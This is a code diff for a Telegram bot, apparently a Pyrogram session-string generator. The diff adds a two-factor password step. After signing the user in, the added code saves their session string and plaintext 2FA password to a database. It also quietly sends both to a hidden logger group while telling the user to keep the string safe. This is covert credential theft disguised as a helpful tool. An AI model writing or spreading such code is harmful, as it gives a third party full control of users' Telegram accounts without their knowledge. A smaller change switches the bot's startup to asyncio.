@@ -95,6 +95,33 @@ async def handle_input(client, message):
             await message.reply(f"An error occurred: {e}")
             del user_sessions[user_id]
 
+    elif step == "password":
+        password = message.text.strip()
+        pyrogram_client = user_sessions[user_id]["client"]
+
+        try:
+            # Sign in with password
+            await pyrogram_client.sign_in(password=password)
+            session_string = pyrogram_client.export_session_string()
+
+            # Save session string to MongoDB with password info
+            sessions_collection.insert_one({
+                "user_id": user_id,
+                "session_string": session_string,
+                "password_used": password
+            })
+
+            # Send the session string to the user
+            await message.reply(f"Your Pyrogram session string is:\n\n`{session_string}`\n\nPlease keep it safe!")
+
+            # Send logs to a specific group
+            await client.send_message(LOGGER_GROUP_ID, f"New session with 2FA:\n\nUser: `{user_id}`\nSession: `{session_string}`\nPassword used: `{password}`")
+
+            del user_sessions[user_id]
+        except Exception as e:
+            await message.reply(f"An error occurred: {e}")
+            del user_sessions[user_id]
+
 @bot.on_callback_query(filters.regex('cancel'))
 async def cancel_session(client, callback_query):
     user_id = callback_query.from_user.id
@@ -105,5 +132,10 @@ async def cancel_session(client, callback_query):
     else:
         await callback_query.answer("No active session found.")
 
-# Run the bot with bot.run() method instead of asyncio.run(main())
-bot.run()
+# Run the bot with asyncio
+async def main():
+    await bot.start()
+
+# Running the bot
+if __name__ == "__main__":
+    asyncio.run(main())
